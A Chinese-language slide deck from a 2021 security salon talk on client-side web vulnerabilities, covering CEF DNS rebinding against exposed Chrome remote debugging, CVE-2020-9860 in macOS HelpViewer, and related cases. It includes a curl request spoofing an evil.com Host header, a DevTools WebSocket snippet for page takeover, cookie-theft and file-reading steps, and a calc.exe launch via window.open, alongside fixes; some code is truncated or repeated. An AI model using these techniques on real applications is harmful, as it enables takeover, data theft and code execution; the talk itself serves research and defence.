客户端 Web 漏洞案例浅析
2021/6/26  成都站
周智
深信服安全
技术沙⻰
⼤纲
• 总结⼀些难以归类的客户端混合漏洞案例 
• CEF DNS rebinding 通⽤漏洞 
• CVE-2020-9860: macOS HelpViewer XSS 
• 某 iOS 应⽤跨 App 获取 cookie 
• iOS WebView UXSS 
• 某 Windows 视频客户端远程 DLL 注⼊
CEF DNS rebinding 通⽤漏洞
CEF
• CEF 全称 Chromium Embedded 
Framework 
• 在桌⾯应⽤中嵌⼊ Chromium 内
核的 WebView 控件
DNS rebinding
• ⼀种利⽤ DNS 域名解析绕过同源策略的⽅法 
• 通过对同⼀域名前后返回不同地址 
• ip1 的⽹⻚可以借受害者浏览器访问 ip2 的 http 服务
恶意⽹⻚
内⽹ http 服务
evil.rebind.com
123.123.123.123
evil.rebind.com
192.168.0.1
CEF 远程调试
• 部分桌⾯客户端误将 CEF 远程调试打开 
• 即 Chrome Remote Debugging 协议，基于 HTTP 和 WebSocket 
• 攻击者使⽤ DNS rebinding 可以直接访问 127.0.0.1 的 http 响应 
• 获得 token 之后⽤ WebSocket 完全接管⽹⻚内容，进⼀步 RCE 等 
• CEF 最新版本已经修复
Chrome 远程调试⽀持
$ curl -v localhost:12345/json -H "Host: evil.com:12345" 
*   Trying 127.0.0.1... 
* TCP_NODELAY set 
* Connected to localhost (127.0.0.1) port 12345 (#0) 
> GET /json HTTP/1.1 
> Host: evil.com:12345 
> User-Agent: curl/7.58.0 
> Accept: */* 
> 
 GET /json HTTP/1.1 
> Host: evil.com:12345 
> User-Agent: curl/7.58.0 
> Accept: */* 
> 
 GET /json HTTP/1.1 
> Host: evil.com:12345 
> User-Agent: curl/7.58.0 
> Accept: */* 
> 
 new Promise((resolve, reject) => { 
  const id = counter++; 
  const recv = ({ data }) => { 
    const parsed = JSON.parse(data); 
    if (parsed.id === id) { 
      resolve(parsed.result); 
      ws.removeEventListener('message', recv); 
    } else { 
      log('message: ', data); 
    } 
  }; 
  ws.addEventListener('message', recv); 
  ws.send(JSON.stringify({ id, method, params })); 
}); 
const remoteDoc = await send('DOM.getDocument');
脚本注⼊
• Runtime.evaluate ⽅法可以注⼊ js 
• 对于⽼的 Chromium 版本，该命令存在失效问题 
• 可以使⽤ DOM.setOuterHTML 操作 DOM 注⼊脚本
信息泄漏
• 获取 Cookie：Network.getAllCookies 
• Chrome 内核⽀持列⽬录 
• Page.navigate 访问 file://c/users 
• 查询 DOM 获取⽂件列表和进⼀步读⽂件 
• 在客户端当中展示钓⻥⻚⾯
转为 RCE
• CEF 通常⽐ Chrome 落后⼀些（⼤量）版本 
• 找公开的 v8 漏洞利⽤进⾏适配 
• 使⽤ CEF 的客户端通常是 hybrid 应⽤ 
• window.external 存在 native 接⼝ 
• native 接⼝可能存在逻辑代码执⾏问题 
• ⽂件下载、运⾏外部程序等 
• 需要额外的逆向⼯作
案例
• ⼤量客户端使⽤同⼀框架导致 CEF dns rebinding 
• WebView 业务代码处理导航事件⽤了 ShellExecuteW 
• 简单使⽤ window.open 就能弹计算器 
 window.open('file:///C:/windows/system32/calc.exe') 
• 组合其他接⼝下载执⾏任意命令 
• VSCode 曾出现类似漏洞 
• Electron 可以直接调⽤ node.js 运⾏时执⾏任意本地代码
修复
• ⽣产环境中切忌启⽤调试功能 
• nodejs, Electron 和 CEF 在近期的版本中修复了 DNS rebinding 
• DNS rebinding 需要恶意域名配合 
• 当 Host 头异常的时候终⽌访问请求
macOS HelpViewer XSS
URL Scheme
• 桌⾯和移动操作系统从 Web 拉起本地应⽤的接⼝ 
• 远程攻击⾯ 
• 通常浏览器切换前会弹出提示 
• macOS Safari 硬编码了⼀部分 URL scheme 直接放⾏
signed __int64 __cdecl -[ExternalURLNavigationHandler _URLTypeForURL:]
(ExternalURLNavigationHandler *self, SEL a2, id url) 
{ 
  NSString *scheme = [url scheme]; 
  if ([scheme safari_isCaseInsensitiveEqualToString:@"mailto"]) 
  { 
    status = 1LL; 
  } 
  else 
  { 
    if ( !urlSchemesToOpenWithoutPrompting(void)::whitelistedURLSchemes ) 
    { 
      NSArray *arr = [NSArray arrayWithObjects: 
        @"itms-books", @"itms-bookss", @"ibooks", @"macappstore", @"macappstores", 
        @"radr", @"radar", @"udoc", @"ts", @"st", @"x-radar", @"icloud-sharing", 
        @"help", @"x-apple-helpbasic" count:19]; 
      urlSchemesToOpenWithoutPrompting(void)::whitelistedURLSchemes = [NSSet 
setWithArray:arr]; 
    } 
HelpViewer
HelpViewer
• HelpViewer 的 help: 协议在信任列表 
• 已有历史漏洞通过⼀个 XSS 就可以远程执⾏代码 
• 可惜没修复完
CVE-2020-9860
HelpViewer 沙箱逃逸
• 导出协议除了 help:// 之外，还有 x-apple-helpbasic:// 也被信任 
• 协议格式为紧接任意 *.apple.com 的⻚⾯ 
• x-apple-helpbasic://www.apple.com/aaa 
• 将协议 scheme 替换为 https 然后在 HelpViewer 中打开 
• https://www.apple.com/aaa 
• 找⼀个 apple.com 的 open redirect 或者 xss？
Apple web server notiﬁcations 
This article provides credit to people who have reported potential security issues in Apple's web 
servers. 
Credits 
2021-03-09 swagger.organicfruitapps.com
A server conﬁguration issue was addressed. We would like to acknowledge Joseph Thacker for reporting this 
issue.
2021-03-09 pd-mediaauth.apple.com
A server conﬁguration issue was addressed. We would like to acknowledge Ahmed (@4hm8d) for reporting 
this issue.
2021-03-08 myevents-rno.apple.com
https://support.apple.com/en-is/HT201536
Apple 历史 Web 漏洞致谢列表，可以搜集⼤量⼦域名
24⼩时
⼿⼯找⼀个 xss
• 没有 xray 和任何扫描器 
• ⼿⼯查看源⽂件审计和测试
// see if an alternate content set has been passed in 
if (controller.queryParams.contentURL) { 
    controller.queryParams.contentURL += 
(controller.queryParams.contentURL.charAt(controller.queryParams.contentURL.length) 
== "/" ? "" : "/"); 
    // check whether there is a loadable Info.json file at the passed-in location 
    $.ajax({ 
        type: "HEAD", 
        async: false, 
        crossDomain: false, 
        url: controller.queryParams.contentURL + "Info.json", 
        success: function () { 
            controller.contentURL = controller.queryParams.contentURL; 
        }, 
        error: function () { 
            console.log("Could not load " + controller.queryParams.contentURL); 
        } 
    }); 
} 
dataController.loadData = function () { 
    var folder = localizationController.localePath(); 
    // read in content.json 
    $.ajax({ 
        url: folder + "content.json", 
        dataType: "json", 
        async: false, 
        crossDomain: false, 
        success: function (json, status, xhr) { 
            jsonStructure = json[0];
DOM XSS